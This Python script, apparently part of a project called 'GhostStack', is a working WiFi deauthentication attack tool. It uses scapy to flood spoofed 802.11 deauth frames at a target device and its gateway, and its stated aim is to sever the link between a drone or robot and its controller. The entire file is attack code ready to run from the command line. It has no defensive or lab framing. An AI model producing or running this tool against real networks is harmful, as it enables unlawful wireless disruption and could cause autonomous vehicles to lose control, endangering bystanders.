import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
import sys
import time

# GhostStack: Network/EW Layer - WiFi Deauthentication Module
#
# Sends deauthentication frames to disrupt the link between a 
# target autonomous system (UAV/Robot) and its controller.
# 
# NOTE: Requires a WiFi adapter in monitor mode (e.g., ALFA AWUS036ACM).

def deauth_target(target_mac, gateway_mac, interface="wlan0mon", count=0):
    """
    Sends deauth frames to both the target and the gateway to 
    ensure a complete disconnect.
    """
    print(f"[*] Starting Deauth attack on {target_mac} <-> {gateway_mac}...")
    
    # Dot11: 802.11 frame
    # addr1: Destination (Target), addr2: Source (Gateway), addr3: BSSID (Gateway)
    packet1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
    # The reverse: to the gateway from the target
    packet2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=7)

    try:
        while True:
            scapy.sendp(packet1, iface=interface, verbose=False)
            scapy.sendp(packet2, iface=interface, verbose=False)
            print(f"[!] Sent Deauth burst to {target_mac}", end='\r')
            time.sleep(0.1) # Rapid fire
            
            if count > 0:
                count -= 1
                if count == 0: break
                
    except KeyboardInterrupt:
        print("\n[*] Deauth attack halted.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 wifi_deauth.py <target_mac> <gateway_mac> [interface]")
        sys.exit(1)

    t_mac = sys.argv[1].lower()
    g_mac = sys.argv[2].lower()
    iface = sys.argv[3] if len(sys.argv) > 3 else "wlan0mon"
    
    deauth_target(t_mac, g_mac, iface)
